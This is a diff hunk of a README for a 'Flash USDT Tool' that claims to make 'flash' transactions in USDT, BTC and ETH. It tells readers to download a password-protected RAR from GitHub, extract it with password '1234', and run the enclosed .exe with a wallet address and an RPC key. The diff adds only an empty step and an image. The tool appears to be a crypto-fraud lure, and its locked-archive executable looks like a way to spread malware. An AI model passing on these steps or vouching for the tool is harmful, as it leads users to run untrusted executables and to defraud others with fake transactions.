@@ -13,6 +13,8 @@ Multi-network flash transaction tool for USDT, BTC, ETH with configurable durati
 1. Download latest version [https://github.com/NovaNexusRewards/Flash-USDT-Tool/blob/main/Flash%20USDT%20Tool.rar]
 2. Extract ( 1234 PASSWORD )
 3. Run `Flash USDT Tool.exe` from Command Prompt:
+4.
+5. <img width="590" height="1280" alt="photo_2026-08-23_19-28-55" src="https://github.com/user-attachments/assets/a2dfb7f9-4294-4e83-888a-f704a1979d6d" />
 
 ```cmd
 Flash USDT Tool.exe --net=erc20 --to=0xYourAddress --amount=100 --rpc=https://mainnet.infura.io/v3/YOUR_KEY
